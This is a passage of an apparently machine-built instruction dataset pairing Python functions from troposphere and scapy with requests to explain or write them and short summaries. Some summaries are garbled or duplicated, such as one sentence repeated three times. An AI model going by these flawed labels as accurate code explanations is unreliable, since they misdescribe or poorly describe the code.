template.add_resource(elasticache.SecurityGroupIngress(\n        'RedisClusterSecurityGroupIngress',\n        CacheSecurityGroupName=Ref(redisclustersg),\n        EC2SecurityGroupName=Ref(webserversg),\n        ))\n\n    template.add_resource(elasticache.CacheCluster(\n        'RedisCluster',\n        Engine='redis',\n        CacheNodeType=Ref(cachenodetype),\n        NumCacheNodes='1',\n        CacheSecurityGroupNames=[Ref(redisclustersg)],\n        ))\n\n    # Outputs\n    template.add_output([\n        Output(\n            'WebsiteURL',\n            Description='Application URL',\n            Value=Join('', [\n                'http://',\n                GetAtt(webserverinstance, 'PublicDnsName'),\n\n                ])\n            )\n        ])\n\n    # Print CloudFormation Template\n    print(template.to_json())"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef validate_backup_window(window):\n\n    hour = r'[01]?[0-9]|2[0-3]'\n    minute = r'[0-5][0-9]'\n    r = (\"(?P<start_hour>%s):(?P<start_minute>%s)-\"\n         \"(?P<end_hour>%s):(?P<end_minute>%s)\") % (hour, minute, hour, minute)\n    range_regex = re.compile(r)\n    m = range_regex.match(window)\n    if not m:\n        raise ValueError(\"DBInstance PreferredBackupWindow must be in the \"\n                         \"format: hh24:mi-hh24:mi\")\n    start_ts = (int(m.group('start_hour')) * 60) + int(m.group('start_minute'))\n    end_ts = (int(m.group('end_hour')) * 60) + int(m.group('end_minute'))\n    if abs(end_ts - start_ts) < 30:\n        raise ValueError(\"DBInstance PreferredBackupWindow must be at least \"\n                         \"30 minutes long.\")\n    return window", "response": "Validate PreferredBackupWindow for DBInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef validate_maintenance_window(window):\n\n    days = (\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\")\n    day_re = r'[A-Z]{1}[a-z]{2}'\n    hour = r'[01]?[0-9]|2[0-3]'\n    minute = r'[0-5][0-9]'\n    r = (\"(?P<start_day>%s):(?P<start_hour>%s):(?P<start_minute>%s)-\"\n         \"(?P<end_day>%s):(?P<end_hour>%s):(?P<end_minute>%s)\") % (day_re,\n                                                                   hour,\n                                                                   minute,\n                                                                   day_re,\n                                                                   hour,\n                                                                   minute)\n    range_regex = re.compile(r)\n    m = range_regex.match(window)\n    if not m:\n        raise ValueError(\"DBInstance PreferredMaintenanceWindow must be in \"\n                         \"the format: ddd:hh24:mi-ddd:hh24:mi\")\n    if m.group('start_day') not in days or m.group('end_day') not in days:\n        raise ValueError(\"DBInstance PreferredMaintenanceWindow day part of \"\n                         \"ranges must be one of: %s\" % \", \".join(days))\n    start_ts = (days.index(m.group('start_day')) * 24 * 60) + \\\n        (int(m.group('start_hour')) * 60) + int(m.group('start_minute'))\n    end_ts = (days.index(m.group('end_day')) * 24 * 60) + \\\n        (int(m.group('end_hour')) * 60) + int(m.group('end_minute'))\n    if abs(end_ts - start_ts) < 30:\n        raise ValueError(\"DBInstance PreferredMaintenanceWindow must be at \"\n                         \"least 30 minutes long.\")\n    return window", "response": "Validate PreferredMaintenanceWindow for DBInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef validate_capacity(capacity):\n\n    if capacity not in VALID_SCALING_CONFIGURATION_CAPACITIES:\n        raise ValueError(\n            \"ScalingConfiguration capacity must be one of: {}\".format(\n                \", \".join(map(\n                    str,\n                    VALID_SCALING_CONFIGURATION_CAPACITIES\n                ))\n            )\n        )\n    return capacity", "response": "Validate ScalingConfiguration capacity for serverless DBCluster"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngive a file name to a valid file returns the file object.", "response": "def file_contents(file_name):\n    \"\"\"Given a file name to a valid file returns the file object.\"\"\"\n    curr_dir = os.path.abspath(os.path.dirname(__file__))\n    with open(os.path.join(curr_dir, file_name)) as the_file:\n        contents = the_file.read()\n    return contents"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef depends_on_helper(obj):\n    if isinstance(obj, AWSObject):\n        return obj.title\n    elif isinstance(obj, list):\n        return list(map(depends_on_helper, obj))\n    return obj", "response": "Handles the. title attribute of a troposphere resource."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nset the Label used in the User Interface for the given parameter.", "response": "def set_parameter_label(self, parameter, label):\n        \"\"\"\n        Sets the Label used in the User Interface for the given parameter.\n        :type parameter: str or Parameter\n        :type label: str\n        \"\"\"\n        labels = self.metadata\\\n            .setdefault(\"AWS::CloudFormation::Interface\", {})\\\n            .setdefault(\"ParameterLabels\", {})\n\n        if isinstance(parameter, BaseAWSObject):\n            parameter = parameter.title\n\n        labels[parameter] = {\"default\": label}"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nadds a parameter to a group", "response": "def add_parameter_to_group(self, parameter, group_name):\n        \"\"\"\n        Add a parameter under a group (created if needed).\n        :type parameter: str or Parameter\n        :type group_name: str\n        \"\"\"\n        groups = self.metadata \\\n            .setdefault(\"AWS::CloudFormation::Interface\", {}) \\\n            .setdefault(\"ParameterGroups\", [])\n\n        if isinstance(parameter, BaseAWSObject):\n            parameter = parameter.title\n\n        # Check if group_name already exists\n        existing_group = None\n        for group in groups:\n            if group[\"Label\"][\"default\"] == group_name:\n                existing_group = group\n                break\n\n        if existing_group is None:\n            existing_group = {\n                \"Label\": {\"default\": group_name},\n                \"Parameters\": [],\n            }\n            groups.append(existing_group)\n\n        existing_group[\"Parameters\"].append(parameter)\n\n        return group_name"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nimports userdata from a file.", "response": "def from_file(filepath, delimiter='', blanklines=False):\n    \"\"\"Imports userdata from a file.\n\n    :type filepath: string\n\n    :param filepath  The absolute path to the file.\n\n    :type delimiter: string\n\n    :param: delimiter  Delimiter to use with the troposphere.Join().\n\n    :type blanklines: boolean\n\n    :param blanklines  If blank lines shoud be ignored\n\n    rtype: troposphere.Base64\n    :return The base64 representation of the file.\n    \"\"\"\n    data = []\n\n    try:\n        with open(filepath, 'r') as f:\n            for line in f:\n                if blanklines and line.strip('\\n\\r ') == '':\n                    continue\n\n                data.append(line)\n    except IOError:\n        raise IOError('Error opening or reading file: {}'.format(filepath))\n\n    return Base64(Join(delimiter, data))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_events(conn, stackname):\n    next = None\n    event_list = []\n    while 1:\n        events = conn.describe_stack_events(stackname, next)\n        event_list.append(events)\n        if events.next_token is None:\n            break\n        next = events.next_token\n        time.sleep(1)\n    return reversed(sum(event_list, []))", "response": "Get the events in batches and return in chronological order"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef tail(conn, stack_name, log_func=_tail_print, sleep_time=5,\n         include_initial=True):\n    \"\"\"Show and then tail the event log\"\"\"\n    # First dump the full list of events in chronological order and keep\n    # track of the events we've seen already\n    seen = set()\n    initial_events = get_events(conn, stack_name)\n    for e in initial_events:\n        if include_initial:\n            log_func(e)\n        seen.add(e.event_id)\n\n    # Now keep looping through and dump the new events\n    while 1:\n        events = get_events(conn, stack_name)\n        for e in events:\n            if e.event_id not in seen:\n                log_func(e)\n                seen.add(e.event_id)\n        time.sleep(sleep_time)", "response": "Show and then tail the event log"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef validate_memory_size(memory_value):\n    memory_value = int(positive_integer(memory_value))\n    if memory_value not in MEMORY_VALUES:\n        raise ValueError(\"Lambda Function memory size must be one of:\\n %s\" %\n                         \", \".join(str(mb) for mb in MEMORY_VALUES))\n    return memory_value", "response": "Validate the memory size for Lambda Function\n   ."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_validator_list(self):\n        ignore = [\n            'dict',\n        ]\n        vlist = []\n        if not self.override:\n            return vlist\n\n        for k, v in list(self.override['classes'].items()):\n            if 'validator' in v:\n                validator = v['validator']\n                if validator not in ignore and validator not in vlist:\n                    vlist.append(validator)\n\n        for k, v in list(self.override['classes'].items()):\n            for kp, vp in list(v.items()):\n                if 'validator' in vp:\n                    validator = vp['validator']\n                    if validator not in ignore and validator not in vlist:\n                        vlist.append(validator)\n        return sorted(vlist)", "response": "Return a list of validators specified in the override file"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _output_tags(self):\n        for class_name, properties in sorted(self.resources.items()):\n            for key, value in sorted(properties.items()):\n                validator = self.override.get_validator(class_name, key)\n                if key == 'Tags' and validator is None:\n                    print(\"from troposphere import Tags\")\n                    return\n        for class_name, properties in sorted(self.properties.items()):\n            for key, value in sorted(properties.items()):\n                validator = self.override.get_validator(class_name, key)\n                if key == 'Tags' and validator is None:\n                    print(\"from troposphere import Tags\")\n                    return", "response": "Look for a Tags object to output a Tags import"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndecode a properties type looking for a specific type.", "response": "def _check_type(self, check_type, properties):\n        \"\"\"Decode a properties type looking for a specific type.\"\"\"\n        if 'PrimitiveType' in properties:\n            return properties['PrimitiveType'] == check_type\n        if properties['Type'] == 'List':\n            if 'ItemType' in properties:\n                return properties['ItemType'] == check_type\n            else:\n                return properties['PrimitiveItemType'] == check_type\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwalking the resources and properties looking for a specific type.", "response": "def _walk_for_type(self, check_type):\n        \"\"\"Walk the resources/properties looking for a specific type.\"\"\"\n        for class_name, properties in sorted(self.resources.items()):\n            for key, value in sorted(properties.items()):\n                if self._check_type(check_type, value):\n                    return True\n        for class_name, properties in sorted(self.properties.items()):\n            for key, value in sorted(properties.items()):\n                if self._check_type(check_type, value):\n                    return True\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a list of non - primitive types used by this object.", "response": "def _get_type_list(self, props):\n        \"\"\"Return a list of non-primitive types used by this object.\"\"\"\n        type_list = []\n        for k, v in list(props.items()):\n            t = self._get_property_type(v)\n            if t is not None:\n                type_list.append(t)\n        return sorted(type_list)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _output_validators(self):\n        if self._walk_for_type('Boolean'):\n            print(\"from .validators import boolean\")\n        if self._walk_for_type('Integer'):\n            print(\"from .validators import integer\")\n        vlist = self.override.get_validator_list()\n        for override in vlist:\n            if override.startswith('common/'):\n                override = override.lstrip('common/')\n                filename = \"validators\"\n            else:\n                filename = \"%s_validators\" % self.filename\n            print(\"from .%s import %s\" % (filename, override))", "response": "Output common validator types based on usage."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef build_tree(self, name, props, resource_name=None):\n        n = Node(name, props, resource_name)\n        prop_type_list = self._get_type_list(props)\n        if not prop_type_list:\n            return n\n        prop_type_list = sorted(prop_type_list)\n        for prop_name in prop_type_list:\n            if prop_name == 'Tag':\n                continue\n            child = self.build_tree(prop_name, self.properties[prop_name])\n            if child is not None:\n                n.add_child(child)\n        return n", "response": "Build a tree of non - primitive typed dependency order."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef output_tree(self, t, seen):\n        if not t:\n            return\n        for c in t.children:\n            self.output_tree(c, seen)\n        if t.name in seen:\n            return\n        seen[t.name] = True\n        if t.resource_name:\n            output_class(t.name, t.props, self.override, t.resource_name)\n        else:\n            output_class(t.name, t.props, self.override)", "response": "Given a dependency tree of objects output it in DFS order."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\noutput the generated source file.", "response": "def output(self):\n        \"\"\"Output the generated source file.\"\"\"\n        print(copyright_header % spec_version)\n        self._output_imports()\n        self._output_tags()\n        self._output_validators()\n        header = self.override.get_header()\n        if header:\n            print()\n            print()\n            print(header.rstrip())\n\n        seen = {}\n        for class_name, properties in sorted(self.resources.items()):\n            resource_name = self.resource_names[class_name]\n            t = self.build_tree(class_name, properties, resource_name)\n            self.output_tree(t, seen)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef inspect_members(self):\n        if not self._inspect_members:\n            TemplateGenerator._inspect_members = \\\n                self._import_all_troposphere_modules()\n        return self._inspect_members", "response": "Returns the list of all troposphere members that are able to be used in this generator"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef inspect_resources(self):\n        if not self._inspect_resources:\n            d = {}\n            for m in self.inspect_members:\n                if issubclass(m, (AWSObject, cloudformation.AWSCustomObject)) \\\n                        and hasattr(m, 'resource_type'):\n                    d[m.resource_type] = m\n\n            TemplateGenerator._inspect_resources = d\n\n        return self._inspect_resources", "response": "Returns a map of ResourceType to ResourceClass"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef inspect_functions(self):\n        if not self._inspect_functions:\n            d = {}\n            for m in self.inspect_members:\n                if issubclass(m, AWSHelperFn):\n                    d[m.__name__] = m\n\n            TemplateGenerator._inspect_functions = d\n\n        return self._inspect_functions", "response": "Returns a map of FunctionName to FunctionClass"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nattempting to find the troposphere class that represents Type of provided resource. Attempts to find the troposphere class that represents Type of provided resource. Attempts to find the troposphere class that represents Type of provided resource.", "response": "def _get_resource_type_cls(self, name, resource):\n        \"\"\"Attempts to return troposphere class that represents Type of\n        provided resource. Attempts to find the troposphere class who's\n        `resource_type` field is the same as the provided resources `Type`\n        field.\n\n        :param resource: Resource to find troposphere class for\n        :return: None: If no class found for provided resource\n                 type: Type of provided resource\n        :raise ResourceTypeNotDefined:\n                  Provided resource does not have a `Type` field\n        \"\"\"\n        # If provided resource does not have `Type` field\n        if 'Type' not in resource:\n            raise ResourceTypeNotDefined(name)\n\n        # Attempt to find troposphere resource with:\n        #   `resource_type` == resource['Type']\n        try:\n            return self.inspect_resources[resource['Type']]\n        except KeyError:\n            # is there a custom mapping?\n            for custom_member in self._custom_members:\n                if custom_member.resource_type == resource['Type']:\n                    return custom_member\n            # If no resource with `resource_type` == resource['Type'] found\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconverts any object to troposphere equivalent if applicable.", "response": "def _convert_definition(self, definition, ref=None, cls=None):\n        \"\"\"\n        Converts any object to its troposphere equivalent, if applicable.\n        This function will recurse into lists and mappings to create\n        additional objects as necessary.\n\n        :param {*} definition: Object to convert\n        :param str ref: Name of key in parent dict that the provided definition\n                        is from, can be None\n        :param type cls: Troposphere class which represents provided definition\n        \"\"\"\n        if isinstance(definition, Mapping):\n            if 'Type' in definition:  # this is an AWS Resource\n                expected_type = None\n                if cls is not None:\n                    expected_type = cls\n                else:\n                    # if the user uses the custom way to name custom resources,\n                    # we'll dynamically create a new subclass for this use and\n                    # pass that instead of the typical CustomObject resource\n                    try:\n                        expected_type = self._generate_custom_type(\n                            definition['Type'])\n                    except TypeError:\n                        # If definition['Type'] turns out not to be a custom\n                        # type (aka doesn't start with \"Custom::\")\n                        if ref is not None:\n                            raise ResourceTypeNotFound(ref, definition['Type'])\n                        else:\n                            # Make sure expected_type is nothing (as\n                            # it always should be)\n                            assert not expected_type\n\n                if expected_type:\n                    args = self._normalize_properties(definition)\n                    return self._create_instance(expected_type, args, ref)\n\n            if len(definition) == 1:  # This might be a function?\n                function_type = self._get_function_type(\n                    definition.keys()[0])\n                if function_type:\n                    return self._create_instance(\n                        function_type, definition.values()[0])\n\n            # nothing special here - return as dict\n            d = {}\n            for k, v in definition.iteritems():\n                d[k] = self._convert_definition(v)\n            return d\n\n        elif (isinstance(definition, Sequence) and\n                not isinstance(definition, basestring)):\n            return [self._convert_definition(v) for v in definition]\n\n        # anything else is returned as-is\n        return definition"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _create_instance(self, cls, args, ref=None):\n        if isinstance(cls, Sequence):\n            if len(cls) == 1:\n                # a list of 1 type means we must provide a list of such objects\n                if (isinstance(args, basestring) or\n                        not isinstance(args, Sequence)):\n                    args = [args]\n                return [self._create_instance(cls[0], v) for v in args]\n\n        if isinstance(cls, Sequence)\\\n           or cls not in self.inspect_members.union(self._custom_members):\n            # this object doesn't map to any known object. could be a string\n            # or int, or a Ref... or a list of types such as\n            # [basestring, FindInMap, Ref] or maybe a\n            # validator such as `integer` or `port_range`\n            return self._convert_definition(args)\n\n        elif issubclass(cls, AWSHelperFn):\n            # special handling for functions, we want to handle it before\n            # entering the other conditions.\n            try:\n                if issubclass(cls, Tags):\n                    arg_dict = {}\n                    for d in args:\n                        arg_dict[d['Key']] = d['Value']\n                    return cls(arg_dict)\n\n                if (isinstance(args, Sequence) and\n                        not isinstance(args, basestring)):\n                    return cls(*self._convert_definition(args))\n\n                if issubclass(cls, autoscaling.Metadata):\n                    return self._generate_autoscaling_metadata(cls, args)\n\n                if issubclass(cls, Export):\n                    return cls(args['Name'])\n\n                args = self._convert_definition(args)\n                if isinstance(args, Ref) and issubclass(cls, Ref):\n                    # watch out for double-refs...\n                    # this can happen if an object's .props has 'Ref'\n                    # as the expected type (which is wrong and should be\n                    # changed to basestring!)\n                    return args\n\n                return cls(args)\n\n            except TypeError as ex:\n                if '__init__() takes exactly' not in ex.message:\n                    raise\n                # special AWSHelperFn typically take lowercased parameters,\n                # but templates use uppercase. for this reason we cannot\n                # map to most of them, so we fallback with a generic one.\n                # this might not work for all types if they do extra\n                # processing in their init routine\n                return GenericHelperFn(args)\n\n        elif isinstance(args, Mapping):\n            # we try to build as many troposphere objects as we can by\n            # inspecting its type validation metadata\n            kwargs = {}\n            kwargs.update(args)\n            for prop_name in getattr(cls, 'props', []):\n                if prop_name not in kwargs:\n                    continue  # the user did not specify this value; skip it\n                expected_type = cls.props[prop_name][0]\n\n                if (isinstance(expected_type, Sequence) or\n                        expected_type in self.inspect_members):\n                    kwargs[prop_name] = self._create_instance(\n                        expected_type, kwargs[prop_name], prop_name)\n                else:\n                    kwargs[prop_name] = self._convert_definition(\n                        kwargs[prop_name], prop_name)\n\n            args = self._convert_definition(kwargs)\n            if isinstance(args, Ref):\n                # use the returned ref instead of creating a new object\n                return args\n            if isinstance(args, AWSHelperFn):\n                return self._convert_definition(kwargs)\n            assert isinstance(args, Mapping)\n            return cls(title=ref, **args)\n\n        return cls(self._convert_definition(args))", "response": "Create an instance of cls with args passed as arguments."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a copy of the definition with any special properties such as Condition UpdatePolicy and DeletionPolicy.", "response": "def _normalize_properties(self, definition):\n        \"\"\"\n        Inspects the definition and returns a copy of it that is updated\n        with any special property such as Condition, UpdatePolicy and the\n        like.\n        \"\"\"\n        args = definition.get('Properties', {}).copy()\n        if 'Condition' in definition:\n            args.update({'Condition': definition['Condition']})\n        if 'UpdatePolicy' in definition:\n            # there's only 1 kind of UpdatePolicy; use it\n            args.update({'UpdatePolicy': self._create_instance(\n                UpdatePolicy, definition['UpdatePolicy'])})\n        if 'CreationPolicy' in definition:\n            # there's only 1 kind of CreationPolicy; use it\n            args.update({'CreationPolicy': self._create_instance(\n                CreationPolicy, definition['CreationPolicy'])})\n        if 'DeletionPolicy' in definition:\n            # DeletionPolicity is very basic\n            args.update(\n                {'DeletionPolicy': self._convert_definition(\n                    definition['DeletionPolicy'])})\n        if 'Metadata' in definition:\n            # there are various kind of metadata; pass it as-is\n            args.update(\n                {'Metadata': self._convert_definition(\n                    definition['Metadata'])})\n        if 'DependsOn' in definition:\n            args.update(\n                {'DependsOn': self._convert_definition(\n                    definition['DependsOn'])})\n        return args"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _generate_custom_type(self, resource_type):\n        if not resource_type.startswith(\"Custom::\"):\n            raise TypeError(\"Custom types must start with Custom::\")\n        custom_type = type(\n            str(resource_type.replace(\"::\", \"\")),\n            (self.inspect_resources['AWS::CloudFormation::CustomResource'],),\n            {'resource_type': resource_type})\n        self.inspect_members.add(custom_type)\n        self.inspect_resources[resource_type] = custom_type\n        return custom_type", "response": "Dynamically allocates a new CustomResource class definition using the specified Custom :: SomeCustomName resource type."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates the autoscaling. Metadata object from the given args.", "response": "def _generate_autoscaling_metadata(self, cls, args):\n        \"\"\" Provides special handling for the autoscaling.Metadata object \"\"\"\n        assert isinstance(args, Mapping)\n        init_config = self._create_instance(\n            cloudformation.InitConfig,\n            args['AWS::CloudFormation::Init']['config'])\n        init = self._create_instance(\n            cloudformation.Init, {'config': init_config})\n        auth = None\n        if 'AWS::CloudFormation::Authentication' in args:\n            auth_blocks = {}\n            for k in args['AWS::CloudFormation::Authentication']:\n                auth_blocks[k] = self._create_instance(\n                    cloudformation.AuthenticationBlock,\n                    args['AWS::CloudFormation::Authentication'][k],\n                    k)\n            auth = self._create_instance(\n                cloudformation.Authentication, auth_blocks)\n\n        return cls(init, auth)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_function_type(self, function_name):\n        if (function_name.startswith(\"Fn::\") and\n                function_name[4:] in self.inspect_functions):\n            return self.inspect_functions[function_name[4:]]\n        return (self.inspect_functions['Ref'] if function_name == \"Ref\"\n                else None)", "response": "Returns the function object that matches the provided name."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _import_all_troposphere_modules(self):\n        dirname = os.path.join(os.path.dirname(__file__))\n        module_names = [\n            pkg_name\n            for importer, pkg_name, is_pkg in\n            pkgutil.walk_packages([dirname], prefix=\"troposphere.\")\n            if not is_pkg and pkg_name not in self.EXCLUDE_MODULES]\n        module_names.append('troposphere')\n\n        modules = []\n        for name in module_names:\n            modules.append(importlib.import_module(name))\n\n        def members_predicate(m):\n            return inspect.isclass(m) and not inspect.isbuiltin(m)\n\n        members = []\n        for module in modules:\n            members.extend((m[1] for m in inspect.getmembers(\n                module, members_predicate)))\n\n        return set(members)", "response": "Imports all troposphere modules and returns them"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef PCO_option_dispatcher(s):\n    option = orb(s[0])\n\n    cls = PCO_OPTION_CLASSES.get(option, Raw)\n    return cls(s)", "response": "Choose the correct PCO element."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef PCO_protocol_dispatcher(s):\n    proto_num = orb(s[0]) * 256 + orb(s[1])\n    cls = PCO_PROTOCOL_CLASSES.get(proto_num, Raw)\n    return cls(s)", "response": "Choose the correct PCO element."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _get_npcap_config(param_key):\n    hkey = winreg.HKEY_LOCAL_MACHINE\n    node = r\"SYSTEM\\CurrentControlSet\\Services\\npcap\\Parameters\"\n    try:\n        key = winreg.OpenKey(hkey, node)\n        dot11_adapters, _ = winreg.QueryValueEx(key, param_key)\n        winreg.CloseKey(key)\n    except WindowsError:\n        return None\n    return dot11_adapters", "response": "Get a Npcap parameter matching key in the registry."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncall a CMD command and return the output and returncode", "response": "def _exec_cmd(command):\n    \"\"\"Call a CMD command and return the output and returncode\"\"\"\n    proc = sp.Popen(command,\n                    stdout=sp.PIPE,\n                    shell=True)\n    if six.PY2:\n        res = proc.communicate()[0]\n    else:\n        res = proc.communicate(timeout=5)[0]\n    return res, proc.returncode"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_windows_if_list(extended=False):\n    # Should work on Windows XP+\n    def _get_mac(x):\n        size = x[\"physical_address_length\"]\n        if size != 6:\n            return \"\"\n        data = bytearray(x[\"physical_address\"])\n        return str2mac(bytes(data)[:size])\n\n    def _get_ips(x):\n        unicast = x['first_unicast_address']\n        anycast = x['first_anycast_address']\n        multicast = x['first_multicast_address']\n\n        def _resolve_ips(y):\n            if not isinstance(y, list):\n                return []\n            ips = []\n            for ip in y:\n                addr = ip['address']['address'].contents\n                if addr.si_family == socket.AF_INET6:\n                    ip_key = \"Ipv6\"\n                    si_key = \"sin6_addr\"\n                else:\n                    ip_key = \"Ipv4\"\n                    si_key = \"sin_addr\"\n                data = getattr(addr, ip_key)\n                data = getattr(data, si_key)\n                data = bytes(bytearray(data.byte))\n                # Build IP\n                if data:\n                    ips.append(inet_ntop(addr.si_family, data))\n            return ips\n\n        ips = []\n        ips.extend(_resolve_ips(unicast))\n        if extended:\n            ips.extend(_resolve_ips(anycast))\n            ips.extend(_resolve_ips(multicast))\n        return ips\n\n    if six.PY2:\n        _str_decode = lambda x: x.encode('utf8', errors='ignore')\n    else:\n        _str_decode = plain_str\n    return [\n        {\n            \"name\": _str_decode(x[\"friendly_name\"]),\n            \"win_index\": x[\"interface_index\"],\n            \"description\": _str_decode(x[\"description\"]),\n            \"guid\": _str_decode(x[\"adapter_name\"]),\n            \"mac\": _get_mac(x),\n            \"ipv4_metric\": 0 if WINDOWS_XP else x[\"ipv4_metric\"],\n            \"ipv6_metric\": 0 if WINDOWS_XP else x[\"ipv6_metric\"],\n            \"ips\": _get_ips(x)\n        } for x in GetAdaptersAddresses()\n    ]", "response": "Returns a list of Windows interfaces through GetAdaptersAddresses."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn all available IPs matching to interfaces using the Windows system.", "response": "def get_ips(v6=False):\n    \"\"\"Returns all available IPs matching to interfaces, using the windows system.\n    Should only be used as a WinPcapy fallback.\"\"\"\n    res = {}\n    for iface in six.itervalues(IFACES):\n        ips = []\n        for ip in iface.ips:\n            if v6 and \":\" in ip:\n                ips.append(ip)\n            elif not v6 and \":\" not in ip:\n                ips.append(ip)\n        res[iface] = ips\n    return res"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets IP from interface name.", "response": "def get_ip_from_name(ifname, v6=False):\n    \"\"\"Backward compatibility: indirectly calls get_ips\n    Deprecated.\"\"\"\n    iface = IFACES.dev_from_name(ifname)\n    return get_ips(v6=v6).get(iface, [\"\"])[0]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef pcapname(dev):\n    if isinstance(dev, NetworkInterface):\n        if dev.is_invalid():\n            return None\n        return dev.pcap_name\n    try:\n        return IFACES.dev_from_name(dev).pcap_name\n    except ValueError:\n        return IFACES.dev_from_pcapname(dev).pcap_name", "response": "Get the device pcap name by device name or Scapy NetworkInterface"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nopening a pcap from an interface.", "response": "def open_pcap(iface, *args, **kargs):\n    \"\"\"open_pcap: Windows routine for creating a pcap from an interface.\n    This function is also responsible for detecting monitor mode.\n    \"\"\"\n    iface_pcap_name = pcapname(iface)\n    if not isinstance(iface, NetworkInterface) and iface_pcap_name is not None:\n        iface = IFACES.dev_from_name(iface)\n    if iface.is_invalid():\n        raise Scapy_Exception(\"Interface is invalid (no pcap match found) !\")\n    # Only check monitor mode when manually specified.\n    # Checking/setting for monitor mode will slow down the process, and the\n    # common is case is not to use monitor mode\n    kw_monitor = kargs.get(\"monitor\", None)\n    if conf.use_npcap and kw_monitor is not None and iface is not None:\n        monitored = iface.ismonitor()\n        if kw_monitor is not monitored:\n            # The monitor param is specified, and not matching the current\n            # interface state\n            iface.setmonitor(kw_monitor)\n    return _orig_open_pcap(iface_pcap_name, *args, **kargs)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nretrieve Windows routes through a GetIpForwardTable call. This is compatible with XP but won t get IPv6 routes.", "response": "def _read_routes_c_v1():\n    \"\"\"Retrieve Windows routes through a GetIpForwardTable call.\n\n    This is compatible with XP but won't get IPv6 routes.\"\"\"\n    def _extract_ip(obj):\n        return inet_ntop(socket.AF_INET, struct.pack(\"<I\", obj))\n    routes = []\n    for route in GetIpForwardTable():\n        ifIndex = route['ForwardIfIndex']\n        dest = route['ForwardDest']\n        netmask = route['ForwardMask']\n        nexthop = _extract_ip(route['ForwardNextHop'])\n        metric = route['ForwardMetric1']\n        # Build route\n        try:\n            iface = dev_from_index(ifIndex)\n            if iface.ip == \"0.0.0.0\":\n                continue\n        except ValueError:\n            continue\n        ip = iface.ip\n        # RouteMetric + InterfaceMetric\n        metric = metric + iface.ipv4_metric\n        routes.append((dest, netmask, nexthop, iface, ip, metric))\n    return routes"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _read_routes_c(ipv6=False):\n    af = socket.AF_INET6 if ipv6 else socket.AF_INET\n    sock_addr_name = 'Ipv6' if ipv6 else 'Ipv4'\n    sin_addr_name = 'sin6_addr' if ipv6 else 'sin_addr'\n    metric_name = 'ipv6_metric' if ipv6 else 'ipv4_metric'\n    ip_len = 16 if ipv6 else 4\n    if ipv6:\n        lifaddr = in6_getifaddr()\n    routes = []\n\n    def _extract_ip_netmask(obj):\n        ip = obj[sock_addr_name][sin_addr_name]\n        ip = bytes(bytearray(ip['byte']))\n        # Extract netmask\n        netmask = (ip_len - (len(ip) - len(ip.rstrip(b\"\\x00\")))) * 8\n        # Build IP\n        ip = inet_ntop(af, ip)\n        return ip, netmask\n\n    for route in GetIpForwardTable2(af):\n        # Extract data\n        ifIndex = route['InterfaceIndex']\n        _dest = route['DestinationPrefix']\n        dest, netmask = _extract_ip_netmask(_dest['Prefix'])\n        nexthop, _ = _extract_ip_netmask(route['NextHop'])\n        metric = route['Metric']\n        # Build route\n        try:\n            iface = dev_from_index(ifIndex)\n            if iface.ip == \"0.0.0.0\":\n                continue\n        except ValueError:\n            continue\n        ip = iface.ip\n        # RouteMetric + InterfaceMetric\n        metric = metric + 